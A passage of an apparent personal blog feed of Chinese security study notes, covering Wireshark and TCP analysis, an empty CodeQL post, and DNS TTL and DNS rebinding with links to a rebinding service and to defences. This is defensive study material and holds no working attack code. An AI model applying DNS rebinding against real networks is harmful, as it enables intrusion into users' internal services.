e6998dba14635d1df41bdac4bdee2d2b7df8e52bfa4eb47b3fafff83821f002c58d402900751785175b9524e8390fc17593b31e06d9d29684550031b791d7274b9f2fe4a7009a3dc05bf507da0bd818b47850be3edabccf6c283bd4dcc42626a41bf2790443fcd17aaff31fb51fa3820ddea37f29603fa7ff9c6c504dcaf82c3137402fdd4bc9c967479dcedb395c0e8e68afcc8ac09ba8d28cc03771e5d74f99f29a6b1f566b337a17e53c1051c7dbf1f1e421d314a0e2000c2d583c22e8b2db1f0fe557b78b114500079ec8fc1cadf969d952fd047372a24cf40039dd435881b13816e86fb223597b31912541583ac3f19ca3a0a969f8fa402cff6a9d9db07b19c3b5f6b50887a0bdae3397457175fb948b5d1c05d6dc4b6b8ac74d5b02cb1e2f78bdeca841adae0ea00e7b9f41009f21cb1e231d0cd5a4daf0e04d8ff14d1b30ceb006a00f9e570067bd2365dea9c53f99cb6d1da5f8d5288c8e6ba36d70f8ccd2226d6ef8010cf41a5a00f1af17cd76ea31c8ad6a8c32f8b0ca8a502319e13144e57a078bcd6ceffaa2db3ec5efb7dc5061bd821204cae4f995dff98bf8e2fa42b53b2dc70f7a87297de2a59c2b3e9e6ffe5804e522a4597898dd3c0ccf1e343f4e4769555cd7e3ac33a9a24baf14f045ef94f365c838314c30a3f1974e2ad48f707ce1760492b567f8c1f4184af5ed11885d27cd716e65f876c27b7110a3d4bded653c699992715212814daee41450a5986dd2d39f5c588300ddf449b210a5c8de4a2431d4dc15c657cedee0bd03c09773831aa9b875ff1f00e878aaf1b3e61e49094fcb8fd3884ec8a09959cfd1a6ec123fc88625d44a5caffe0d43d5ab7ad0e1d10c0259869fd825580bf65a317984291005ea611bc8ddd82a944c736a1d6e7d667ff1b98db31fa5e5fcf67260c0dbb2effd40c56bd4fa096168bb2f0ab90038fa68eff46769877fdc56df398d6fc63f4671ecb209950be20a7d1743b5c9b0278b68cd9ae79dcd917e81cc640adb3aff81614e20d1abd76c65d827c50a3c318ea87e45f6fb9ec7c4bf2a9b6e0395bfc056cdefdccb7855fb38820f64a18be4791e05a7061557e1c2f21e14c14d85b5e55141654bb759a1117bbedd04e033c12e8bf27292c907c4f983b068dda1e8ffc2857cdef0991c88ad09b39a0761099f0ca0f1fdb56ae1c0780ff18a27b6fcfbb930c0b5695a97fb59a6ef2bedd68813e477833779fc6dfd482a6641fded21369da87ed603ed685e59502ce02c79bfd89dc8af3442e8cd1733b199b406c8451b4e47af00dcf3a93f8dbeea8b1193fc73c708ba0cfd5f604fe87a8ab1c427ee332404ed81ef0268e6e84147298050628fd8aed3986f4e75c09c16a0b9204f4b68975418844822000e7724209bdde4e9b65cfcf2a0824d60ef471114cc14544f60abb008124b52711c71119a906b15a9ef9989bfb3a837c70ec2c33dd5def1f87f3c077eb155c41ceaa7ccf35c405ef3e2f79dfcb8d830eaa9a570da736013b3ee895ab00928845bb906603445ff83933834c3c3cb4352f7f9222be05f7e0b0d2141da4df838969fcf44ef5c668dac74fc007cdb10c665b280975ed92c6795dcc1c63ec8cc0a5bf88bb948bc18e534</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>wireshark使用复习与技巧总结</title>
    <link href="http://example.com/2022/08/16/wireshark/"/>
    <id>http://example.com/2022/08/16/wireshark/</id>
    <published>2022-08-16T05:23:53.000Z</published>
    <updated>2022-08-16T11:29:13.425Z</updated>
    
    <content type="html"><![CDATA[<p>重新系统的学习一下wireshark的使用 和一些tip</p><span id="more"></span><h2 id="tcp协议"><a href="#tcp协议" class="headerlink" title="tcp协议"></a>tcp协议</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TCP/IP协议包含了一系列的协议，也叫TCP/IP协议族（TCP/IP Protocol Suite，或TCP/IP<br>Protocols），简称TCP/IP。TCP/IP协议族提供了点对点的连结机制，并且将传输数据帧的封装、寻址、传输、路由以及接收方式，都予以标准化。</p><p>TCP/IP协议的分层模型<br>在展开介绍TCP/IP协议之前，首先介绍一下七层ISO模型。国际标准化组织ISO为了使网络应用更为普及，推出了OSI参考模型，即开放式系统互联（Open System Interconnect）模型，一般都叫OSI参考模型。OSI参考模型是ISO组织在1985年发布的网络互连模型，其含义就是为所有公司使用一个统一的规范来控制网络，这样所有公司遵循相同的通信规范，网络就能互联互通了。</p><p>OSI模型的七层框架<br>OSI模型定义了网络互连的七层框架（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层），每一层实现各自的功能和协议，并完成与相邻层的接口通信。OSI模型各层的通信协议，大致举例如下表所示：</p><p>表：OSI模型各层的通信协议举例</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>应用层</td><td>HTTP、SMTP、SNMP、FTP、Telnet、SIP、SSH、NFS、RTSP、XMPP、Whois、ENRP、等等</td></tr><tr><td>表示层</td><td>XDR、ASN.1、SMB、AFP、NCP、等等</td></tr><tr><td>会话层</td><td>ASAP、SSH、RPC、NetBIOS、ASP、Winsock、BSD Sockets、等等</td></tr><tr><td>传输层</td><td>TCP、UDP、TLS、RTP、SCTP、SPX、ATP、IL、等等</td></tr><tr><td>网络层</td><td>IP、ICMP、IGMP、IPX、BGP、OSPF、RIP、IGRP、EIGRP、ARP、RARP、X.25、等等</td></tr><tr><td>数据链路层</td><td>以太网、令牌环、HDLC、帧中继、ISDN、ATM、IEEE 802.11、FDDI、PPP、等等</td></tr><tr><td>物理层</td><td>例如铜缆、网线、光缆、无线电等等</td></tr></tbody></table><p>TCP/IP协议是Internet互联网最基本的协议，其在一定程度上参考了七层ISO模型。OSI模型共有七层，从下到上分别是物理层、数据链路层、网络层、运输层、会话层、表示层和应用层。但是这显然是有些复杂的，所以在TCP/IP协议中，七层被简化为了四个层次。TCP/IP模型中的各种协议，依其功能不同，被分别归属到这四层之中，常被视为是简化过后的七层OSI模型。</p><img src="/2022/08/16/wireshark/image-20220816154145886.png" alt="image-20220816154145886" style="zoom:50%;"><h3 id="根据抓包解释tcp协议"><a href="#根据抓包解释tcp协议" class="headerlink" title="根据抓包解释tcp协议"></a>根据抓包解释tcp协议</h3><img src="/2022/08/16/wireshark/u=2300501918,2244649802&fm=253&fmt=auto&app=138&f=JPG.jpeg" alt="img" style="zoom:67%;"><blockquote><p>源端口号和目的端口号与udp中类似，用于寻找发端和收端应用进程。这两个值加上IP首部中的源端IP地址和目的端IP地址唯一确定一个TCP连接，在网络编程中，一般一个IP地址和一个端口号组合称为一个套接字（socket）。</p><p>序号：用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据字节。在tcp中tcp用序号对每个字节进行计数(这个值与发送的帧数没有关系，而是与发送的数据字节数有关系，后面会有说明）。</p><p>确认序号：包含发送确认的一端所期望收到的下一个序号。因此，确认序号应当是上次已成功收到数据字节序号加 1（不是单纯的序号加1，还包括数据字节数）。<br>首部长度：用于记录tcp数据报首部的长度，一般为20字节，实际值为首部长度除以4。<br>URG： 紧急指针（ urgent pointer）有效。<br>ACK： 确认序号有效。<br>PSH： 接收方应该尽快将这个报文段交给应用层。<br>RST： 重建连接。<br>SYN： 同步序号用来发起一个连接。<br>FIN： 发端完成发送任务。<br>窗口大小：用于流量控制。<br>检验和：检验和覆盖了整个的 TCP报文段： TCP首部和TCP数据，与udp相似需要计算伪首部。</p></blockquote><p><img src="/2022/08/16/wireshark/image-20220816151441233.png" alt="image-20220816151441233"></p><p>来解释一下这个包</p><table><thead><tr><th>name</th><th>explanation</th></tr></thead><tbody><tr><td>Source port</td><td>端口</td></tr><tr><td>Destination Port</td><td>目标端口</td></tr><tr><td>Sequence Number</td><td>序号</td></tr><tr><td>Ackonwledgment Number</td><td>确认序号</td></tr><tr><td>Header Length</td><td>头部长度</td></tr><tr><td>Flags</td><td>标志位</td></tr><tr><td>Windows</td><td>窗口大小</td></tr><tr><td>Checksum</td><td>校验和</td></tr><tr><td>Urgent Pointer</td><td>紧急指针</td></tr><tr><td>SEQ/ACK nanlysis</td><td>数据</td></tr></tbody></table><h3 id="TCP连接的建立"><a href="#TCP连接的建立" class="headerlink" title="TCP连接的建立"></a>TCP连接的建立</h3><p><img src="/2022/08/16/wireshark/u=3570401071,2147058580&fm=253&fmt=auto&app=138&f=PNG.png" alt="img"></p><p><img src="/2022/08/16/wireshark/image-20220816155024805.png" alt="image-20220816155024805"></p><p>如图所示 为tcp三次握手</p><h3 id="TCP连接的释放"><a href="#TCP连接的释放" class="headerlink" title="TCP连接的释放"></a>TCP连接的释放</h3><p>　　当通信双方完成数据传输，需要进行TCP连接的释放，由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。因为正常关闭过程需要发送4个TCP帧，因此这个过程也叫作4次挥手。具体过程如下图：<br><img src="wireshark/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F668%2Fcb4ff609101576bd217c96773ace4b34.png&refer=http%3A%2F%2Fwww.pianshen.jpeg" alt="img" style="zoom: 150%;"></p><p>图从百度搜的 有点糊</p><p><img src="/2022/08/16/wireshark/image-20220816161129684.png" alt="image-20220816161129684"></p><p>但做的这题中包的顺序似乎不太一致</p><h2 id="SMTP协议分析"><a href="#SMTP协议分析" class="headerlink" title="SMTP协议分析"></a>SMTP协议分析</h2><blockquote><p>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP协议属于TCP/IP协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过SMTP协议所指定的服务器,就可以把E-mail寄到收信人的服务器上了，整个过程只要几分钟。SMTP服务器则是遵循SMTP协议的发送邮件服务器，用来发送或中转发出的电子邮件。SMTP<br>是一种TCP协议支持的提供可靠且有效电子邮件传输的应用层协议。</p></blockquote><p>没什么太多要分析的  主要是状态码搞明白就很容易看懂了</p><p><a href="https://blog.csdn.net/qq_35644234/article/details/68961603">https://blog.csdn.net/qq_35644234/article/details/68961603</a></p><h2 id="Analysed-Information"><a href="#Analysed-Information" class="headerlink" title="Analysed Information"></a>Analysed Information</h2><h3 id="Expert-Information"><a href="#Expert-Information" class="headerlink" title="Expert Information"></a>Expert Information</h3><p>Clicking on <strong>Analyze</strong> <em>–&gt;</em> <strong>Expert Information</strong> you will have an <strong>overview</strong> of what is happening in the packets <strong>analised</strong>:</p><p><img src="/2022/08/16/wireshark/image-20220816174653410.png" alt="image-20220816174653410"></p><p>可以很直观的审视所有数据包</p><h3 id="Resolved-Addresses"><a href="#Resolved-Addresses" class="headerlink" title="Resolved Addresses"></a>Resolved Addresses</h3><p>Under <strong>Statistics –&gt; Resolved Addresses</strong> you can find several <strong>information</strong> that was “<strong>resolved</strong>“ by wireshark like port/transport to protocol, mac to manufacturer… This is interesting to know what is implicated in the communication.</p><p><img src="/2022/08/16/wireshark/image-20220816175036341.png" alt="image-20220816175036341"></p><h3 id="Protocol-Hierarchy"><a href="#Protocol-Hierarchy" class="headerlink" title="Protocol Hierarchy"></a>Protocol Hierarchy</h3><p>Under <strong>Statistics –&gt; Protocol Hierarchy</strong> you can find the <strong>protocols</strong> <strong>involved</strong> in the communication and data about them.</p><p><img src="/2022/08/16/wireshark/image-20220816175150238.png" alt="image-20220816175150238"></p><h3 id="Conversations"><a href="#Conversations" class="headerlink" title="Conversations"></a>Conversations</h3><p>Under <strong>Statistics –&gt; Conversations</strong> you can find a <strong>summary of the conversations</strong> in the communication and data about them.</p><p><img src="/2022/08/16/wireshark/image-20220816184406176.png" alt="image-20220816184406176"></p><h3 id="Endpoints"><a href="#Endpoints" class="headerlink" title="Endpoints"></a>Endpoints</h3><p>Under <strong>Statistics –&gt; Endpoints</strong>you can find a <strong>summary of the endpoints</strong> in the communication and data about each of them.</p><p><img src="/2022/08/16/wireshark/image-20220816184507719.png" alt="image-20220816184507719"></p><h3 id="DNS-info"><a href="#DNS-info" class="headerlink" title="DNS info"></a>DNS info</h3><p>Under <strong>Statistics –&gt; DNS</strong> you can find statistics about the DNS request captured.</p><p><img src="/2022/08/16/wireshark/image-20220816184604945.png" alt="image-20220816184604945"></p><p><strong>I/O Graph</strong></p><p>Under<strong>Statistics –&gt; I/O Graph</strong> you can find a <strong>graph of the communication.</strong></p><h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>Here you can find wireshark filter depending on the protocol: <a href="https://www.wireshark.org/docs/dfref/">https://www.wireshark.org/docs/dfref/</a> Other interesting filters:</p><h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><p>If you want to <strong>search</strong> for <strong>content</strong> inside the <strong>packets</strong> of the sessions  <em>CTRL+f</em> __You can add new layers to the main information bar <em>(No., Time, Source…)</em> pressing <em>right bottom</em> and Edit Column</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;重新系统的学习一下wireshark的使用 和一些tip&lt;/p&gt;</summary>
    
    
    
    <category term="wireshark" scheme="http://example.com/categories/wireshark/"/>
    
    
    <category term="wireshark" scheme="http://example.com/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>codeql</title>
    <link href="http://example.com/2022/08/16/codeql/"/>
    <id>http://example.com/2022/08/16/codeql/</id>
    <published>2022-08-15T17:27:35.000Z</published>
    <updated>2022-08-23T19:12:57.205Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
</summary>
      
    
    
    
    <category term="codeQl" scheme="http://example.com/categories/codeQl/"/>
    
    
    <category term="codeQl" scheme="http://example.com/tags/codeQl/"/>
    
  </entry>
  
  <entry>
    <title>DNS相关攻防</title>
    <link href="http://example.com/2022/08/16/DNS-%E6%94%BB%E9%98%B2/"/>
    <id>http://example.com/2022/08/16/DNS-%E6%94%BB%E9%98%B2/</id>
    <published>2022-08-15T16:55:10.000Z</published>
    <updated>2022-08-16T16:46:37.060Z</updated>
    
    <content type="html"><![CDATA[<p>感觉面试比较容易问到 学学 重点放在如何防守</p><span id="more"></span><h2 id="DNS原理"><a href="#DNS原理" class="headerlink" title="DNS原理"></a>DNS原理</h2><p>这里不多废话了</p><p><a href="http://www.ruanyifeng.com/blog/2016/06/dns.html">DNS 原理入门 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><h2 id="DNS-TTL"><a href="#DNS-TTL" class="headerlink" title="DNS TTL"></a>DNS TTL</h2><p>TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。</p><p>当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p><p>常见的设置TTL值的场景</p><p>1.增大TTL值，以节约域名解析时间</p><p>通常情况下域名解析记录是很少更改的。我们可以通过增大域名记录的TTL值让记录在各地DNS服务器中缓存的时间加长，这样在更长的时间段内，我们访问这个网站时，本地ISP的DNS服务器就不需要向域名的NS服务器发出解析请求，而直接从本地缓存中返回域名解析记录,从而提高解析效率。 TTL值是以秒为单位的，通常的默认值都是3600，也就是默认缓存1小时。我们可以根据实际需要把TTL值扩大，例如要缓存一天就设置成86400。</p><p>2.减小TTL值，减少更新域名记录时的不可访问时间</p><p>更换空间因为TTL缓存的问题，新的域名记录，在有的地方可能生效了，有的地方可能等上一两天甚至更久才生效。结果就是有的人访问到了新服务器，有的人访问到了旧服务器。如果原来的域名TTL值设置的小，各地的ISP域名缓存服务器服务器就会很快的访问你域名的权威DNS解析服务器，尽快把你域名的DNS解析IP返回给查询者。</p><h2 id="DNS-重绑定"><a href="#DNS-重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定</h2><blockquote><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><p>工具</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">rbndr.us dns rebinding service (cmpxchg8b.com)</a></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><a href="https://blog.tokumaru.org/2022/05/dns-rebinding-protection.html">https://blog.tokumaru.org/2022/05/dns-rebinding-protection.html</a></p><ul><li>检查主机名或虚拟默认虚拟主机</li><li>认证功能的实现（设置安全密码）</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;感觉面试比较容易问到 学学 重点放在如何防守&lt;/p&gt;</summary>
    
    
    
    <category term="DNS" scheme="http://example.com/categories/DNS/"/>
    
    
    <category term="DNS" scheme="http://example.com/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>research path</title>
    <link href="http://example.com/2022/08/16/research-path/"/>
    <id>http://example.com/2022/08/16/research-path/</id>
    <published>2022-08-15T16:50:14.000Z</published>
    <updated>2022-08-23T19:13:26.830Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html">http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;http://blog.orange.tw/2018/08/how-i-chained</summary>
      
    
    
    
    <category term="bug" scheme="http://example.com/categories/bug/"/>
    
    
    <category term="bug" scheme="http://example.com/tags/bug/"/>
    
  </entry>
  
</feed>
